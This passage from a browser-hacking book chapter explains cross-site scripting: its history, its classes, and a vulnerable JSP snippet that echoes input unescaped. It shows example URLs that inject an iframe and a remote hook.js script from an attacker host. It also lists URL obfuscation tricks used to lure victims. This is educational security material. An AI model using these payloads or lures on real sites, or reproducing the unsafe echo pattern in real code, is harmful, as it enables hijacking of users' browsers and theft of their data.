
You have a myriad of ways at your disposal to capture control of your target browsers. This is thanks to the explosive growth of the Internet, the complexity in modern browsers, the number of dynamically executable languages, and the confusing models of trust.

The remainder of this chapter discusses various control initiation methods but you shouldn’t consider them an exhaustive set. The rapidly changing face of the browser will likely continue to yield different options for you.

## Using Cross-site Scripting Attacks

Prior to the introduction of JavaScript into Netscape Navigator in 1995,1 web content was mostly statically delivered HTML. If a website wanted to change any content, the user would typically have to click a link, which then initiated an entirely new HTTP request/response process. It was begging for some kind of dynamic language.

Then, of course, along came JavaScript. It wasn’t too long after the introduction of a dynamic language into web browsers that the first known instances of malicious code injection were reported.

One of the earliest reported cases was by Carnegie Mellon University’s Computer Emergency Response Team Coordination Center, also known as CERT/CC, in February of 2000. The CERT Advisory CA-2000-022 described the inadvertent inclusion of malicious HTML tags or scripts and how these may impact users through the execution of malicious code. Initial examples of malicious activities included:

*   Poisoning of cookies

*   Disclosing sensitive information

*   Violating origin-based security policies

*   Alteration of web forms

*   Exposing SSL-encrypted content

Although the initial advisory described the attack as “cross-site” scripting only in passing, it was eventually known as Cross-site Scripting, or CSS. To reduce confusion with Cascading Style Sheets, the security industry also referred to it as XSS.3 Over time, Cross-site Scripting, or XSS, has proven to be a particularly prevalent attack due to vulnerabilities within website code.

Generally speaking, XSS occurs when untrusted content is processed and subsequently trusted for rendering by the browser. If this content contains HTML, JavaScript, VBScript, or any other dynamic content, the browser will potentially execute untrusted code.

An example scenario would be if an XSS flaw existed within the Google App Store — an attacker might then be able to trick a user into installing a malicious Chrome Extension. This actually occurred in the wild and was demonstrated by Jon Oberheide in 2011. Oberheide demonstrated the exploitation of an XSS flaw within the Android Web Market, as it was known at the time. When executed by a victim, the exploit would install arbitrary applications with arbitrary permissions onto their device.4

There are varying classifications of XSS, but in broad terms, they impact either side of the browser/server relationship. The traditional Reflected XSS and Persistent XSS relate to flaws in the server-side implementation, whereas DOM XSS and Universal XSS exploit client-side vulnerabilities.

Of course, you can even envision a hybrid where a partial flaw exists in the client and another partial flaw exists in the server. Individually, they might not be a security issue but together they create an XSS vulnerability.

Like a lot of areas in security, you are likely to see these rather grey boundaries morph as more attack methods are discovered. However, for historical and educational advantages, the following traditional broad classifications of XSS will be used throughout the book.

### Reflected Cross-site Scripting

Reflected XSS flaws are probably the most common form of XSS discovered. A Reflected XSS occurs when untrusted user data is submitted to a web application that is then immediately echoed back into the response, effectively reflecting the untrusted content in the page. The browser sees the code come from the web server, assumes it’s safe, and executes it.

Like most XSS flaws, Reflected XSS is bound by the rules of the Same Origin Policy. This type of vulnerability occurs within server-side code. An example of vulnerable JSP code is presented here:

```
<% String userId = request.getParameter("user"); %>
Your User ID is <%= userId %>
```

This code retrieves the user query parameter and echoes its contents directly back into the response. Abusing this flaw may be as trivial as visiting http://browservictim.com/userhome.jsp?user=<iframe%20src=http://browserhacker.com/></iframe>. When rendered, this would include an IFrame to browserhacker.com within the page.

Abusing the same flaw to introduce remote JavaScript into the browser can be performed by tricking a target into visiting http://browservictim.com/userhome.jsp?user=<script%20src=http://browserhacker.com/hook.js></script>. When this URL is processed by the web application, it returns the <script> block back within the HTML. The browser, upon receiving this HTML, sees the <script> block and includes the remote JavaScript, which subsequently executes within the context of the vulnerable origin.

As you will discover later in this chapter, successfully exploiting these web application weaknesses may require a degree of social engineering. For example, you may need to supply a shortened or obfuscated URL, or employ other methods to trick a user into visiting your crafted URL.

 start feature 

* * *

**URL Obfuscation** The following are ways in which to obfuscate a URL: 

*   URL Shorteners

*   URL Redirectors

*   URL- or ASCII-encoded characters

*   Adding a number of extra, irrelevant query parameters with the malicious payload either in the middle or toward the end

*   Using the @ symbol within a URL to add fake domain content

*   Converting the hostname into an integer, for example http://3409677458

* * *

 end feature   start feature 

* * *

**Real-World Reflected XSS** There have been so many real-world examples of Reflected XSS flaws that it’s difficult to list just a few, but some of the more notable examples include: 

*   Ramneek Sidhu’s “Reflected XSS vulnerability affects millions of sites hosted in HostMonster” ([http://www.ehackingnews.com/2013/01/reflected-xss-hostmonster.html](http://www.ehackingnews.com/2013/01/reflected-xss-hostmonster.html))

Level1 HostMonster’s hosting platform included a default HTTP 404 error page for all of its hosted websites. Unfortunately, this error page included a function to display ads, which was subsequently exploitable through an XSS flaw. This exploitable code was then usable on every single site hosted by HostMonster. /Level1 

*   XSSed’s “F-Secure, McAfee and Symantec websites again XSSed” ([http://www.xssed.com/news/130/F-Secure\_McAfee\_and\_Symantec_websites_again_XSSed/](http://www.xssed.com/news/130/F-Secure_McAfee_and_Symantec_websites_again_XSSed/))

Level1 XSSed, a popular website for reporting XSS flaws, posted an article highlighting simple Reflected XSS vulnerabilities discovered in popular security vendors’ websites. These vendors included F-Secure, McAfee, and Symantec. /Level1 

*   Michael Sutton’s “Mobile App Wall of Shame: ESPN ScoreCenter” ([http://research.zscaler.com/2013/01/mobile-app-wall-of-shame-espn.html](http://research.zscaler.com/2013/01/mobile-app-wall-of-shame-espn.html))

Level1 XSS flaws aren’t necessarily constrained to standard web browsers. ZScaler researcher Michael Sutton discovered an XSS flaw within a mobile website that was primarily rendered in a WebView controller within an iPhone app. Quite often app developers will leverage embedded web frames within their apps to display information. Regardless of where the website was rendered—on a desktop browser or within an iPhone app—it was still vulnerable to XSS flaws. /Level1 

* * *

 end feature 

### Stored Cross-site Scripting
